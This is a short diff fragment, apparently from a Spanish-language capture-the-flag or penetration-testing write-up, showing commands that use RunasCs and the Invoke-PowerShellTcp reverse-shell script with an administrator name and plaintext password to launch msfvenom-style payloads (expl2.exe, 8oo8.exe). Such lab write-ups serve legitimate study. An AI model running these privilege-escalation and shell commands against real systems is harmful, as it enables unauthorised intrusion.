@@ -156,3 +156,5 @@ aqui subiremos un nuevo payload con msfvenom como hicimos anteriormente pero en 
 .\ RunasCs_net2.exe  Administrador  s67u84zKq8IXw expl2.exe
 
 .\Invoke-PowerShellTcp.ps1 Administrador  s67u84zKq8IXw expl2.exe
+
+RunasCs.exe “Administrator” “” “C:\\users\\svc_minecraft\\server\\logs\\8oo8.exe”
